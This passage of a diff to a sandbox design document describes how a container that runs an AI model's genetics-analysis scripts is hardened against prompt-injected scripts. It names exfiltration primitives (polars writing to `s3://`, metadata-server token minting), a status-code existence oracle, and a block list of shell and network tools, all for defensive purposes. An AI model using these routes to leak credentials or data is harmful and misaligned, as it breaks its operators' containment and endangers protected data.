+`__slots__` and overwriting all fail, which was measured. The only thing that works is never
+letting the bytes into the process that forks. It is forked out of the supervisor after
+`prewarm()` and before the first byte of the first request body is read; per execution it
+receives one control message plus four descriptors and reads none of them.
 
-`sandbox/` in this repo: `Dockerfile`, `requirements.txt` (pinned analysis deps),
-`build-checks.py` (build-time assertions), `prewarm.py`, `supervisor.py`,
-`prune_venv.py`, `genetics_alias.py` (installed into the venv as `genetics.py`), `schema/`
-and `stubs/`. Built by
-`build-all.sh` and by `build.sh sandbox`, tagged from this repo's HEAD like `monitor` and
-`keycloak`, with the genetics-mcp-server commit recorded in the image label
-`com.fulltiltgenomics.genetics-mcp-server-ref` because the tag alone does not identify the
-contents.
+Two mechanisms make "before the first byte" true, because the HTTP server is already serving
+during startup: `_Handler._execute` refuses on `not SUPERVISOR.accepting()` **before**
+`_read_body`, so no Python object is built, and `_HeaderBoundedReader` consumes only the
+request head, so the body never leaves the kernel receive queue. Both were measured necessary —
+with only the first, a body sharing a TCP segment with its headers was recoverable from a child
+forked promptly after the 503.
 
-**Deviation 1 — the builder is `python:3.11-slim`, not `python:3.12-slim`.**
-`gcr.io/distroless/python3-debian12:nonroot` ships **CPython 3.11.2** (bookworm's system
-python), verified by running it. The final stage runs *that* interpreter against the venv's
-site-packages, so a 3.12 venv would place cp312-tagged native wheels — numpy, scipy, polars
-and matplotlib all ship them — in front of a 3.11 interpreter and fail at import. The
-builder must track the base image's minor version. The decision's intent (venv built in a
-slim stage; no compiler, pip or package manager in the final image) is unchanged.
+### Rejected controls
 
-**No pip, and it took a second pass to be true.** `python -m venv` seeds pip and
-setuptools into the venv, and the final stage copies the venv verbatim, so the first
-build of this image shipped `pip 24.0` and `setuptools 79.0.1`: `python3 -m pip install`
-ran inside the sandbox, and the assertion that was supposed to catch it walked only the
-distroless rootfs — never `/opt/venv`, which is where they were. `sandbox/prune_venv.py`
-now deletes pip, setuptools, `pkg_resources`, `_distutils_hack` and the whole of
-`/opt/venv/bin` in the builder stage, and the assertion walks `/dl`, `/opt/venv` and
-`/out` and additionally proves the modules are not importable. Nothing needed
-`/opt/venv/bin`: the entrypoint is `/usr/bin/python3` with `PYTHONPATH` at
-site-packages, and the venv's own `bin/python3` was a dangling symlink to the builder's
-interpreter in any case.
+| control | why not |
+|---|---|
+| A custom seccomp profile | `RuntimeDefault` under gVisor already means the sentry, not the host kernel, services the syscall. A bespoke profile is a maintenance surface that breaks scientific Python in ways that surface as an unreproducible script failure. |
+| Per-view scoping of the sandbox token | The `scope` claim exists as a hook and only its presence is checked. Narrowing it means db-api learning which views an execution may read, which is a per-request policy store it does not have. |
+| Requiring the sandbox token on all results-api routes | auth-gateway's `@api_bearer` location sends real users straight to results-api with no shared secret, so a blanket requirement 401s them. |
+| A `PodDisruptionBudget` on the sandbox | Its pool is pinned at one node, so a blocking budget would stall every upgrade and repair of that node. See residual 6. |
+| Streaming the `/execute` response | The head-and-tail cap is uncomputable until the stream ends, the manifest and the error object are only knowable at the end, and the model consumes the whole result in one turn regardless. |
 
-**Deviation 2 — the SDK is installed `--no-deps`, and only its import closure ships.**
-"The SDK is pip-installed from genetics-mcp-server at build time" and "no
-`google-auth`-based client in the image" (section 3(c)) cannot both hold if
-genetics-mcp-server's own dependency set is resolved: that set contains
-`google-auth[requests]`, plus anthropic, openai and fastapi. The image therefore installs
-the package with `--no-deps` from a staged checkout and declares the SDK's real runtime
-closure itself in `sandbox/requirements.txt` (numpy, scipy, polars, matplotlib, httpx —
-`python-dotenv` was needed only while `config/settings.py` was in the closure and
-`pydantic` only while `tools/definitions.py` was, and each went with its module rather
-than becoming a pin; see below). `build-checks.py` fails the build if a
-`google-auth`/`google-cloud` distribution reappears by any route, and separately if
-`import google.auth` succeeds. The cost is that the closure is declared in two places and
-can drift: an SDK that grows a new dependency fails the build's import check rather than
-silently shipping.
+### The image
 
-`--no-deps` bounds the *distributions*; it does not bound the *files*, and pip installs
-the whole `genetics_mcp_server` package — 51 modules, of which the SDK imports 10. The
-other 41 (chat_api, llm_service, mcp_server, mcp_proxy, subagent, `config/`, `auth/`,
-`routers/`, `db/`, `skills/`, `scripts/`) are unimportable in the sandbox for want of fastapi and
-anthropic, but that is the wrong property to rely on: a prompt-injected script *reads*
-files, and `auth/core.py` is the `X-Goog-Authenticated-User-Email` model every service in
-the suite trusts. `sandbox/prune_venv.py` therefore cuts the installed package to an
-explicit `SDK_ALLOWLIST`, and `build-checks.py` asserts the surviving set *equals* it, so
-the surface grows deliberately rather than with the next `pip install`.
+Built from `sandbox/`, multi-stage: a venv assembled in a slim builder, pruned, byte-compiled
+and copied into `gcr.io/distroless/python3-debian12:nonroot`. No shell, no package manager, no
+`curl` — `execute_script`'s `bash` interpreter is absent from the filesystem rather than
+un-allow-listed. The builder must track the base image's CPython **minor** version, because the
+final stage runs the distroless interpreter against the venv's site-packages.
 
-**One file in `site-packages` is not part of that distribution: `genetics.py`**
-(`sandbox/genetics_alias.py`, copied by the Dockerfile — `genetics-results-suite-706`). It
-is three lines that rebind `sys.modules[__name__]` to `genetics_mcp_server.sdk`, so
-`import genetics` — the name `run_analysis`'s description, `list_capabilities`' module
-enum, the shipped `stubs/genetics.pyi` and `schema/README.md` all already use — resolves to
-the SDK **itself** rather than to a second module object with its own copy of the client
-state. It ships only here: `genetics` is too generic a top-level name to claim in
-chat-backend and mcp-server, which install the same distribution. It is outside
-`prune_sdk`'s reach by construction (that walks `site-packages/genetics_mcp_server` only)
-and outside `_sdk_surface`'s assertion for the same reason; a separate build check asserts
-the *identity*, not merely that the import succeeds. Disclosure: it names
-`genetics_mcp_server.sdk`, which the stubs already do.
+The genetics SDK is not vendored: it is pip-installed `--no-deps` from a staged
+genetics-mcp-server checkout at build time, so the sandbox and mcp-server cannot drift apart. A
+bare `docker build sandbox/` fails without it, by design. `--no-deps` matters on its own —
+genetics-mcp-server's dependency set contains `google-auth`, and `google.auth.default()`
+resolves `metadata.google.internal` by name where the sandbox has no DNS.
 
-**`config/settings.py` used to be in the closure; it no longer is** (`l41`). It reached
-the image because `sdk/client.py` imports `tools/executor.py`, whose module-level `from
-genetics_mcp_server.tools.uniprot import UniProtClient` pulled `from
-genetics_mcp_server.config.settings import Settings`, and `ToolExecutor.__init__` called
-`get_settings()` at construction. So the sandbox shipped a file naming
-`INTERNAL_API_SECRET`, `ANTHROPIC_API_KEY`, `BIGQUERY_API_URL`, `ADMIN_USERS`,
-`ALLOWED_EMAILS`, `GOOGLE_TOKEN_AUDIENCE` and the on-disk paths of the two SQLite
-databases — names, never values, but names are the internal model an attacker would
-otherwise have to guess. Both edges were cut in genetics-mcp-server: uniprot's `Settings`
-import is behind `if TYPE_CHECKING` with a string annotation, and the executor resolves
-settings through `_resolve_settings()` at first use, falling back to a frozen
-`_PrunedInstallSettings` carrying `Settings`' own defaults when the module is absent —
-which is exactly this image, and which is correct there because the sandbox pod holds no
-internal secret (`4h6.9`). The secret is hard-coded empty in that fallback rather than
-read from the environment, so the variable's *name* does not come back into the image
-through the replacement. `tests/test_sdk_import_closure.py` in genetics-mcp-server pins
-the 10-module closure so it cannot regrow silently; `SDK_ALLOWLIST` here is the
-build-time backstop.
+`sandbox/build-checks.py` runs in the builder and asserts the **final** image's properties,
+because the final stage has no shell and nothing can be checked after it is assembled: the
+absent shell and package manager, `/etc/nsswitch.conf` ordering, the pruned SDK surface, the
+advertised uids, the absence of placeholder schema docs, and `GCE_METADATA_HOST` pinned to a
+literal address. That last one is the branch a distribution-name check cannot see: polars links
+`object_store`, a Rust GCS client that mints metadata tokens with no Python in the path.
 
-**`tools/definitions.py` used to be in the closure; it no longer is** (`6bv`). Same shape,
-one module along, and it is the reason that guard test changed shape too. `sdk/client.py`
-imports `tools/executor.py`, which runs the `genetics_mcp_server.tools` package
-`__init__` — and that `__init__` eagerly re-exported `TOOL_DEFINITIONS`,
-`get_anthropic_tools` and every other `__all__` entry except `ToolExecutor` (five more
-names as of this writing) from `definitions.py`. `executor.py` never
-imported `definitions` itself; the parent package's convenience re-export was the whole
-edge. It cost nothing while `definitions.py` imported only the standard library, and then
-`4h6.70` added `from pydantic import Field` at its module scope to emit
-`minimum`/`maximum`/`pattern` in the MCP schemas, and the image's own `import
-genetics_mcp_server.sdk` check started failing for want of pydantic. The re-export is now
-a module `__getattr__` on `tools/__init__.py`, resolved on first attribute access, so
-`from genetics_mcp_server.tools import TOOL_DEFINITIONS` still works everywhere in the
-service and the SDK path never touches it. Adding `pydantic` to `sandbox/requirements.txt`
-was the alternative and was rejected: that file declares the closure, so widening it to
-satisfy an import the closure does not need inverts the argument the file is making.
-Dropping `definitions.py` also stops the image shipping the ~2600-line catalogue of every
-tool the suite exposes, its parameter bounds and its profile map — the same
-`prompt-injected script reads files` disclosure `l41` was about, and the reason
-`test_named_modules_stay_out` now names it beside `config/settings.py`.
+<!-- BEGIN GENERATED: image -->
 
-The guard on the genetics-mcp-server side is no longer per-offender. It was
-`test_importing_the_sdk_does_not_need_dotenv`, which stubbed out exactly the module `l41`
-had removed and therefore could not have caught this one.
-`test_the_sdk_imports_with_every_unpinned_third_party_module_blocked` replaces it: the
-probe resolves the transitive requirement closure of this file's five pinned
-distributions, installs a `sys.meta_path` finder that raises `ModuleNotFoundError` for
-every *other* installed distribution's top-level modules, and imports the SDK. A third
-offender fails there, in the commit that introduces it, instead of in this repo's image
-build. Blocking by installed distribution rather than by an allow-list of names leaves the
-standard library and the interpreter's own private modules alone, and it deliberately
-tolerates a *denied attempt* inside a `try: ... except ImportError` — httpx's optional CLI
-entry point is one, and it is absent from this image too.
+The final stage's environment, all of it:
 
-**`tools/executor.py` still ships, and remains a residual disclosure.** `sdk/client.py`
-imports `ToolExecutor` directly and every SDK method delegates to it, so it cannot leave
-the closure without a rewrite of the SDK. With it ship the SQL-building
-methods an earlier draft recorded as blocking the sandbox path — their interpolation is now
-guarded by `tools/sql_safety.py`, see "Handoffs" below — and these environment-variable names — re-derive this
-list by grepping the ten closure modules, not by trusting it:
+- `GCE_METADATA_HOST=169.254.169.254`
+- `GENETICS_MPLCACHE=/genetics/mplcache`
+- `GENETICS_PREWARM=/genetics/prewarm.py`
+- `GENETICS_SCHEMA_DIR=/genetics/schema`
+- `GENETICS_STUBS_DIR=/genetics/sdk`
+- `MPLBACKEND=Agg`
+- `PYTHONFAULTHANDLER=1`
+- `PYTHONPATH=/opt/venv/lib/python3.11/site-packages`
+- `PYTHONUNBUFFERED=1`
+- `SANDBOX_CHILD_UID=65533`
+- `SANDBOX_SHARED_GID=65532`
+- `SANDBOX_SUPERVISOR_UID=65532`
 
-| name | where | kind |
-|---|---|---|
-| `GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL` | `tools/executor.py`, the `base_url` / `public_url` / `bigquery_url` properties | live `os.environ.get` |
-| `PERPLEXITY_API_KEY`, `TAVILY_API_KEY`, `LITERATURE_SEARCH_BACKEND` | `tools/executor.py`, the literature-search tools | live `os.environ.get` |
-| `INTERNAL_API_SECRET` | `sdk/__init__.py` and `sdk/client.py` docstrings/comments; `stubs/genetics.pyi`, `stubs/client.pyi`, which the final stage copies to `/genetics/sdk/` | prose only, no read — and since `4h6.44` the prose is a **negation**: both stubs say the sandbox credential is the per-execution token and never this secret |
+`TMPDIR`, `HOME`, `MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` are deliberately absent: they are per-execution and point inside `/scratch/<id>`, and a fixed path here would recreate the cross-execution shared directory removing the pod-level `/tmp` was meant to prevent.
 
-The three endpoint names are a map of the injection sites in the one backend the sandbox
-may reach. The three literature-search names are live reads whose values the sandbox pod
-does not hold; removing them would change the behaviour of those tools and is out of scope
-here.
+`prune_venv.py` reduces the installed distribution to the SDK's import closure, and `build-checks.py` asserts the surviving set is exactly:
 
-`INTERNAL_API_SECRET` in the SDK docstrings and the shipped stubs is an **accepted
-residual**, not an oversight (`4h6.13` recorded the exfiltration note in `client.pyi` as
-operational knowledge the agent is meant to read) — but **the argument for keeping it has
-changed with `4h6.44`, and the earlier one is no longer available.** That argument was that
-"endpoint URLs are not configurable because the client attaches `INTERNAL_API_SECRET` to
-every request" is a warning the reader can check against the deployment. The premise is now
-false on the sandbox path: the client attaches a **per-execution, audience-bound token** and
-never the shared secret, so a stub that said otherwise would be teaching the model a
-deployment that does not exist.
+- `genetics_mcp_server/__init__.py`
+- `genetics_mcp_server/sdk/__init__.py`
+- `genetics_mcp_server/sdk/_runner.py`
+- `genetics_mcp_server/sdk/client.py`
+- `genetics_mcp_server/sdk/errors.py`
+- `genetics_mcp_server/tools/__init__.py`
+- `genetics_mcp_server/tools/executor.py`
+- `genetics_mcp_server/tools/phewas_categories.py`
+- `genetics_mcp_server/tools/sql_safety.py`
+- `genetics_mcp_server/tools/uniprot.py`
 
-What the stubs say now, and why the name still appears, is the **negation** — the SDK does
-not use `INTERNAL_API_SECRET`, it uses a credential the supervisor delivers per execution.
-That is worth naming for two reasons. It remains checkable against the deployment, which is
-what made the original phrasing preferable to a genericised "an internal credential". And it
-carries the operational fact the reader actually needs: the credential in hand is short-lived
-and scoped, so a script that tries to hoard it is hoarding something that expires, and the
-endpoint URLs are still not parameters because handing *that* token to a chosen host is still
-handing a live credential somewhere it should not go.
+plus `genetics.py`, the `import genetics` alias. Everything else the wheel installed is deleted — unimportable there for want of fastapi, but a prompt-injected script reads source, it does not import it. `pip`, `setuptools` and the venv's `bin/` go with it: `_distutils_hack`, `pip`, `pkg_resources`, `setuptools`, `wheel`.
 
-It discloses nothing the reader cannot already derive — the SDK it is being handed
-authenticates on its behalf — and the sandbox pod does not hold the value (`4h6.9`), so
-`os.environ.get("INTERNAL_API_SECRET")` inside the sandbox returns nothing: the name is not a
-key to anything present, and after `4h6.44` it is not even a key to anything the SDK would
-send. This is a different calculus from `config/settings.py`, which named a dozen *unrelated*
-variables and so handed over the shape of the whole internal surface rather than the one
-credential the caller is already using.
+<!-- END GENERATED: image -->
 
-**A substantial part of the shipped `ToolExecutor` is INERT in the image, and that is now
-stated rather than discovered at call time** (`genetics-results-suite-tbg`). `executor.py`
-is one file holding both halves of the executor: the data functions the SDK path uses, and
-the orchestration the chat backend and mcp-server call. Five modules the closure reaches at call time are absent from
-this image, and every one of them is reachable — the scope note at the top of this document
-says `GeneticsClient._executor` is one attribute access from a documented entry point, and
-these are exactly the methods that reaches:
+`sandbox/schema/` and `sandbox/stubs/` are the model's on-demand description of the data and of
+the SDK, generated by `scripts/gen-sandbox-docs.py` from `configs/datasets.yaml` and the SDK
+source and verified by `scripts/test-sandbox-docs.py`. They are generated rather than written
+for the reason this document's own tables are: a transcribed schema inside a container image is
+something nothing would ever notice going stale. Shipping the placeholders degrades silently —
+`run_analysis` works, the pod is healthy, and the model reads a file that says it is not the
+real documentation — so the build refuses while one is staged.
 
-| module | absent because | reached from |
-|---|---|---|
-| `ddgs` | not in `sandbox/requirements.txt` — that file declares the closure and is closed at numpy/scipy/polars/matplotlib/httpx | `web_search` → `_search_duckduckgo` |
-| `genetics_mcp_server.sandbox_client` | outside `SDK_ALLOWLIST`, so `prune_venv.py` deletes it | `run_analysis`, `read_artifact`, `_sandbox` |
-| `genetics_mcp_server.auth.core` | outside `SDK_ALLOWLIST` | `run_analysis` |
-| `genetics_mcp_server.sandbox_token` | outside `SDK_ALLOWLIST` | `run_analysis` |
-| `genetics_mcp_server.tools.definitions` | outside `SDK_ALLOWLIST` | **not an executor method** — `tools/__init__.py`'s lazy `__getattr__`, i.e. `from genetics_mcp_server.tools import TOOL_DEFINITIONS` |
-
-The fifth was **created by `6bv`**, the fix immediately above. Making the re-export lazy moved
-that failure from this package's import — where the image's own `import genetics_mcp_server.sdk`
-check would have caught it — to first attribute access, where nothing does. Worth noticing that
-the shape this section is about is partly a *consequence* of the closure cuts rather than an
-accident alongside them: each cut trades a build-time failure for a call-time one, which is the
-right trade only if the call-time failure is legible.
-
-Re-derive that set with an AST walk over the **function-level** imports of all ten closure
-modules — not just `executor.py`, which is where the fifth hides — checked
-against `requirements.txt` and `SDK_ALLOWLIST`; the module-level imports are not where this
-lives, which is the whole reason it survived two guards. `build-checks.py` runs `import
-genetics_mcp_server.sdk` inside the image and a deferred import is never executed by that;
-genetics-mcp-server's `test_sdk_import_closure.py` blocks unpinned distributions and then
-imports the SDK, with the same blind spot. Both stay green.
-
-**What a script sees now.** Each of those import sites in genetics-mcp-server is wrapped in
-`except ModuleNotFoundError` with a name check — the shape `_resolve_settings` already used
-for `config/settings.py`, and the name check is load-bearing: a `ModuleNotFoundError` from
-deeper inside a module that *is* installed is a broken install outside the sandbox and must
-propagate. The guarded methods return a shaped failure with `error_type:
-"CapabilityUnavailable"` and `retryable: false`, saying the module is not installed here and
-no rewrite reaches it, instead of raising a bare `ModuleNotFoundError` in a container with no
-shell and no package manager. `_analysis_hint` no longer answers these with "call
-`list_capabilities` for the exact signatures" — `web_search` and `run_analysis` will never
-appear in that list, so it pointed the model at a catalogue that could not explain the
-failure. `tools/__init__.py`'s `__getattr__` is the one site left **unguarded on purpose**: it
-has no result shape to return, and the `ImportError: cannot import name 'definitions' from
-'genetics_mcp_server.tools'` it already raises names the missing module accurately — the defect
-there was only the hint, so only the hint changed. That error is an `ImportError`, and an
-ImportError of that shape never carries the dotted path, so the hint matches `cannot import
-name 'X' from 'Y'` as well as `No module named '…'`. Outside the sandbox all five modules are
-present and every guard is a pass-through, so chat-backend and mcp-server behaviour is
-unchanged.
-
-**Widening the image was considered and rejected.** Adding `ddgs` to `requirements.txt` buys
-nothing: the sandbox NetworkPolicy has no DNS rule (section 3), so DDGS would stall the glibc
-resolver for the full timeout rather than fail fast — a worse failure than the guarded one.
-Adding `sandbox_client`, `auth/core.py`, `sandbox_token` and `definitions.py` to
-`SDK_ALLOWLIST` would undo `l41` and `6bv` along with it, and would ship a
-confused-deputy surface — a sandboxed script able to construct a supervisor client and mint
-against an identity model — with no egress rule that lets it be used, and `auth/core.py` is
-the one file `prune_venv.py`'s docstring names as the reason the allow-list exists. The
-guards are the containment-preserving answer. The architectural fix — splitting the
-orchestration half of `executor.py` out of the shipped half, so these imports are unreachable
-by construction rather than by a guard — is filed separately.
-
-**The stubs are generated, so this passage is checkable rather than asserted.**
-`scripts/gen-sandbox-docs.py --sdk-src` derives `stubs/client.pyi` and `stubs/genetics.pyi`
-from the SDK source, `scripts/test-sandbox-docs.py` fails if the committed stubs differ from a
-fresh generation, and `scripts/build.sh` stages them into the image. **Neither script defaults to
-`sandbox/.sdk-src`** (`genetics-results-suite-4h6.60`): `build.sh` creates that staged copy and
-removes it on an `EXIT` trap, so a copy found on disk means an *interrupted* build — the old
-default was, by construction, reachable only when it was stale, and a regeneration from it would
-rewrite these shipped stubs from an old SDK while the check that exists to catch that either
-passed against the wrong source or failed for an unrelated-looking reason. With no `--sdk-src`
-both scripts now take `GENETICS_SDK_SRC`, then `MCP_SERVER_DIR`, then the live sibling
-genetics-mcp-server checkout (worktree-matching one first, each gated on
-`src/genetics_mcp_server/sdk` existing, the resolution `run-sandbox-local.sh` already used),
-print which source they chose, and report a leftover staged copy instead of reading it.
-`build.sh` is unaffected — it passes `--sdk-src` explicitly, pointing at the copy it staged that
-run. A change to the SDK's
-docstrings therefore *cannot* leave the shipped stubs describing the old transport without
-failing that check — which is what caught this row after `4h6.44` landed. Re-derive the row
-above from the regenerated stubs; do not adjust it in place.
-
-What is *not* in the residual list: `config/settings.py` and `auth/core.py` are both out of
-the closure and neither ships, so no LLM provider key, allow-list, OAuth audience or
-database path is named anywhere in the image. No values of any kind ship — every entry
-above is a name.
-
-**Build-time assertions** (`sandbox/build-checks.py`, run in the builder stage against the
-artefacts the final stage copies, because the final stage has no shell to check anything
-in) — ten of them: `/etc/nsswitch.conf` present with `files` before `dns` (section 3(b));
-no shell, package manager, `pip`, `curl`, `wget`, `nc` or `ssh` anywhere in `/dl`,
-`/opt/venv` or `/out`; pip/setuptools/`pkg_resources` not importable; no `google-auth`
-distribution in the venv and `import google.auth` failing; any native object carrying a
-GCE metadata client answered by a literal-IP `GCE_METADATA_HOST` in the final stage
-(section 3(c), below); the surviving `genetics_mcp_server` modules equal to the SDK
-allow-list; no `PLACEHOLDER*` file in the staged `schema/` or `stubs/`; every analysis
-library **and `genetics_mcp_server.sdk`** importing cleanly; `passwd` carrying both uids
-on the shared gid; the matplotlib font cache baked. The probes run
-`python3 -S` with `PYTHONPATH` at site-packages rather than `/opt/venv/bin/python3`,
-which no longer exists and which was never how the final image runs anyway.
-
-**Section 3(c) is met by its second branch, not its first.** "No `google-auth`-based
-client in the image" was only ever true of the *Python distribution name*, which is not
-the property the control needs. polars links `object_store`, a full Rust GCS/S3/Azure
-client: in the built image `pl.scan_parquet("gs://…")` performs the metadata token
-request itself, with no google-auth and no Python in the path, and the native object
-contains `metadata.google.internal`, `169.254.169.254`, `computeMetadata`,
-`GCE_METADATA_HOST` and `oauth2.googleapis.com`. Left alone that is a name resolution
-inside a DNS-less pod — the multi-second stall 3(c) exists to prevent, measured at
-**86.7s** for one `scan_parquet` against a blackholed resolver — and, in a pool that ever
-runs in GCE_METADATA mode, a two-line token mint. The image therefore takes 3(c)'s named
-fallback and sets `GCE_METADATA_HOST=169.254.169.254`. **Verified, not assumed**: with the
-variable pointed at a listener on `127.0.0.1`, object_store sent it
-`GET /computeMetadata/v1/instance/service-accounts/default/token?audience=…` — it honours
-the variable, so the pin keeps the name out of the resolver. What the pin does *not* do is
-confine anything: `pl.write_parquet("s3://…")` remains an exfiltration primitive
-independent of httpx, and it is `4h6.8`'s NetworkPolicy that closes it. `build-checks.py`
-now greps the venv's `.so` files for the metadata strings and fails unless the final stage
-pins the variable to a literal IPv4, because the old check — grep for distribution names,
-`import google.auth` — reported green while the capability sat compiled into Rust.
-
-**The image does not build without the SDK, deliberately.** `4h6.11` has landed on
-genetics-mcp-server's `worktree-db-only-architecture` branch but not on `master`, so a
-default `build-all.sh` still finds no `src/genetics_mcp_server/sdk/` and skips the sandbox
-with a loud message while the rest of the suite builds; `build.sh sandbox` fails hard,
-because asking for that image by name and getting one without the SDK would be worse than
-an error. Building against the branch that has it (`MCP_SERVER_BRANCH=…`) is what the
-assertions above were verified against.
-
-**The image does not build with `4h6.13`'s placeholders either, by the same reasoning.**
-Shipping them degrades *silently*: `run_analysis` runs, the pod is healthy, and the model
-reads a file telling it this is not the real schema. `build-checks.py` fails the build on
-any `PLACEHOLDER*` file in the staged trees, which couples this image to `4h6.13` exactly
-as the import assertion couples it to `4h6.11`. `4h6.13` has since landed and the
-placeholders are gone — see "Schema docs and stubs" below.
-
-**Interpreter pre-warming is split.** The image supplies `/genetics/prewarm.py` (the module
-list and a `prewarm()` that imports it, **raising `PrewarmError`** on any failure rather
-than returning the names — none of these modules is optional, and a supervisor that
-ignored the return value would answer health checks while every plotting script failed
-inside the child) and bakes the two costs that a fork cannot amortise:
-`.pyc` for the whole venv (`compileall`; the root filesystem is read-only, so without this
-every import in every execution recompiles) and the matplotlib font cache. The long-lived
-supervisor that calls `prewarm()` before its first fork is `4h6.39`'s; the image has **no
-`CMD`**, because a placeholder supervisor would be indistinguishable from a real one at
-runtime. Cold import of the full stack measured **2.99s** in the built image — that is the
-per-execution cost pre-warming removes.
-
-**Hard contract for `4h6.39` on matplotlib, verified not assumed.** `MPLCONFIGDIR` pointing
-at a read-only directory does **not** merely warn on matplotlib 3.10: with no writable
-`/tmp` it raises `OSError: Matplotlib requires access to a writable cache directory`. So the
-supervisor **must** copy `$GENETICS_MPLCACHE` (`/genetics/mplcache`, the baked font cache)
-into a writable directory and point `MPLCONFIGDIR` there **before** importing matplotlib.
-This is startup work, not per-execution work: the child inherits the imported font manager
-through the fork, so the per-execution `MPLCONFIGDIR` under `/scratch/<id>` required by the
-writable-paths row costs nothing.
-
-**Environment the image sets**, all of it non-per-execution: `PYTHONPATH` (the venv's
-site-packages — the venv's `bin/` is deleted in the builder stage, and its `python3` was a
-symlink to the builder's interpreter), `GCE_METADATA_HOST=169.254.169.254` (section 3(c);
-see "met by its second branch" above — this one is a security control, not a convenience,
-and `build-checks.py` fails the build if it is removed while polars ships),
-`PYTHONUNBUFFERED`, `PYTHONFAULTHANDLER`, `MPLBACKEND=Agg`, `GENETICS_MPLCACHE`,
-`GENETICS_SCHEMA_DIR`, `GENETICS_STUBS_DIR`, `GENETICS_PREWARM`, and
-`SANDBOX_SUPERVISOR_UID` / `SANDBOX_CHILD_UID` / `SANDBOX_SHARED_GID` (65532 / 65533 /
-65532) so `4h6.7` and `4h6.39` read the uids rather than restating them — but the uid choice is
-now settled as option (b), one shared uid 65532 ("The uid choice", section 2), so
-`SANDBOX_CHILD_UID` names a uid nothing can switch to and `4h6.39` must not fork against it. `TMPDIR`, `HOME`,
-`MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` are deliberately **not** set:
-they are per-execution and belong under `/scratch/<execution-id>`, and a fixed value in the
-image would recreate exactly the shared cross-execution directory that removing the
-pod-level `/tmp` eliminated.
-
-**Schema docs and stubs (`4h6.13`, landed).** `scripts/gen-sandbox-docs.py` writes schema
-markdown into `sandbox/schema/` and `.pyi` signature stubs into `sandbox/stubs/`; the
-Dockerfile copies those directories verbatim to `/genetics/schema/` and `/genetics/sdk/`
-owned `65532:65532`, exported as `GENETICS_SCHEMA_DIR` and `GENETICS_STUBS_DIR`. **No
-Dockerfile change was needed** — the contract `4h6.6` fixed held exactly as written. The
-`PLACEHOLDER*` files are gone and neither directory is empty; `build-checks.py` still
-fails the build on any `PLACEHOLDER*` file, so the coupling stays. `/genetics/sdk/` is
-**not** on `PYTHONPATH` and must not be added to it — the importable SDK is the real
-package in `/opt/venv`, and two copies of those names on `sys.path` would shadow silently;
-the generated stubs say so in their own header.
-
-**Neither tree names the BigQuery dataset any more (`bee`).** The worked example SQL and
-the `sql()` docstring used to be written `FROM genetics_results.<view>`, so both shipped
-directories carried the production dataset name into the image. They now name views bare
-(`FROM <view>`) because a bare name in a table position resolves against db-api's own
-`DATASET_ID`. **The mechanism changed under this paragraph and the earlier description of
-it is wrong:** db-api no longer rewrites anything. `4h6.53` deleted `_qualify_tables` and
-its helpers and set `default_dataset` on *both* job configs instead — the dry run's and the
-execution's, deliberately identical, so the statement the dry run parses is the one that
-runs — and BigQuery does the resolution itself. The conclusion is unaffected by the swap:
-BigQuery reports `referencedTables` fully qualified whichever way the name was written, so
-`authorize_query` compares fully-qualified ids either way and a script that qualifies a
-table itself is held to exactly the same allow-list: qualified *correctly* it is served,
-and only a name carrying the wrong project or dataset is refused. The reason not to write
-examples that way is therefore not that they would be rejected — it is that
-self-qualification **pins** the example to one project and dataset, so it breaks the moment
-either changes, while a bare name follows whatever `default_dataset` the deployment sets. View *names* remain disclosed, as they always were, and are
-separately obtainable through `get_database_schema`.
-
-**What this does *not* buy is secrecy of the dataset name, and an earlier version of this
-paragraph claimed it did.** Keeping the name out of the image is worth doing — an image
-layer is copied, scanned and shipped, and a name that is not in it cannot leak from it —
-but it does not make the name unobtainable to a running script, and the doc must not be
-read as saying so. `authorize_query`'s `NotFound`/`BadRequest` branch returns BigQuery's
-`e.message` verbatim in a 400, so one query naming a table that does not exist answers with
-`Not found: Table <project>:<dataset>.foo was not found` — `PROJECT_ID` and `DATASET_ID`, to
-any caller, in one round trip. The allow-list 403 discloses the same class of information
-independently, by echoing the resolved fully-qualified `disallowed` ids back.
-
-**This is accepted, not deferred, and db-api's 400/403 text is deliberately left alone.**
-The sandboxed script already reads those views through the SDK and the allow-list bounds
-its reach regardless of what it knows, so the dataset name buys an attacker nothing it did
-not already have; and that 400 is the actionable error a human writing SQL against `/query`
-depends on, which is a live requirement of `3za`, not an oversight. Note what muting the
-text would *not* achieve, because that argument has been made here before and is false:
-**the status code alone is an existence oracle.** A table that does not exist is a 400; one
-that exists but is not allow-listed is a 403; one that exists but the service account
-cannot read is also a 403. So "does this table exist" is answerable whatever any message
-says, and no amount of message-muting closes it. The service account holds *project-level*
-`bigquery.dataViewer`, so within the project nearly every not-allow-listed table lands in
-the second case rather than the third. If the oracle itself is ever judged to matter, that
-is a change to db-api's status codes with a compatibility story for `/query`'s human
-callers, and it needs its own bead.
-
-Both trees are *generated, never transcribed*. The schema markdown is rendered from this
-repo's canonical `configs/datasets.yaml` — one file per entry under `tables:`, carrying its
-description, columns, enumerable columns and worked example SQL — and the stubs are read
-out of the genetics SDK's source with `ast` (never imported: importing would execute
-`genetics_mcp_server.config.settings`, and the build host has no polars or httpx). The
-generator names no view and no SDK function; `scripts/test-sandbox-docs.py` asserts that,
-asserts the three correctness rules `4h6.13` names are present *in `datasets.yaml`*, and
-asserts that mutating those YAML fields moves the generated output. The reason is that a
-transcribed rule has no runtime symptom: the image builds green while `/genetics/schema`
-contradicts the canonical file, and `genetics-results-suite-5p5` is an open P1 that will
-rewrite `credible_sets_v`'s variant/chr guidance. Both build scripts regenerate before
-building, so the image can never document a schema older than the file it came from;
-`build.sh sandbox` fails hard if generation fails, `build-all.sh` skips the sandbox loudly.
-The generated files are also committed, so the directories are never empty and the diff of
-a `datasets.yaml` change is visible in review.
-
-**Image size is 607 MB.** numpy, scipy, matplotlib and polars are most of it. Noted because
-the sandbox node pool is pinned at one node and pulls the image on every node replacement.
-
-### The HTTP contract between chat-backend and the supervisor (`4h6.38`)
+### The HTTP contract between chat-backend and the supervisor
 
 **This subsection is the interface, because there cannot be a shared module.** The image
-pip-installs only the genetics SDK's import closure and `sandbox/prune_venv.py` deletes
-everything else, so chat-backend's client (`4h6.47`) and the supervisor (`4h6.39`) cannot
-import one definition of the wire shape. Two implementers building against different
-assumptions is not recoverable by fixing one side. Every field below therefore states its
